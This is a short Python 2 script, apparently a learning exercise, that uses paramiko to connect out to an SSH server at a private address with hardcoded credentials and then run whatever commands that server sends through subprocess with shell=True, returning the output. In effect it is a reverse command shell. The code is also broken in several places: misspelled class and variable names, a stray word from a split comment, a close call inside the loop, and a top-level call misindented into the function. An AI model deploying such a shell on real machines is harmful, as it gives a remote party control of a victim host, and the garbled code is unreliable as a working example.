import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHCLient()
    #client.load_host_keys('some-location')
    client.set_missing_host_key_policy(paramiko.AudoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print ssh_session.recv(1024) #read banner
        while True:
            command = ssh_session.recv(1024) #get the command from SSH
            server
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_sessoin.send(cmd_output)
            except Exception, e:
                ssh_session.send(str(e))
            client.close()
        return
    ssh_command('192.168.100.130', 'colin', 'interperet', 'ClientConnected')